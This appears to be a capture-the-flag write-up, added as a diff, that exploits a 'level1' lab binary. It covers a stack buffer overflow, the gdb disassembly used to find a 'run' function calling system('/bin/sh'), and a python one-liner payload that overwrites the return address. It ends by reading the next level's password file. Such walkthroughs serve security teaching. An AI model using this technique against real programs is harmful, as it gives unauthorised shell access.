@@ -1,0 +1,40 @@
+- After running the program, we found that it read from the stdout.
+
+- We checked if we can do a buffer overflow, so we tried to enter a big string with more than 100 chars.
+
+$> ./level1
+testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
+Segmentation fault (core dumped)
+
+- Good, so now we need to know the buffer size, to do that we will use gdb.
+
+$> gdb ./level1
+gdb> disass main
+
+- We found the buffer size is 0x50 = 80
+
+- Also we checked all functions on the program with 'info functions' and we found a function (run) with a calling to system function. 
+
+gdb> info functions
+0x080482f8  _init
+[...]
+0x08048444  run
+0x08048480  main
+[...]
+
+gdb> disass run
+0x08048444 <+0>:	push   %ebp
+0x08048445 <+1>:	mov    %esp,%ebp
+[...]
+0x08048472 <+46>:	movl   $0x8048584,(%esp)
+0x08048479 <+53>:	call   0x8048360 <system@plt>
+[...]
+
+gdb> x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+- To exploit the program we generated a string with 76 chars and add the address of the run function (0x08048444) with the little-endian (\x44\x84\x04\x08) format.
+
+$> python -c "print('-' * 76) + '\x44\x84\x04\x08'" > /tmp/test
+$> cat /tmp/test - | ./level1
+> cat /home/user/level2/.pass
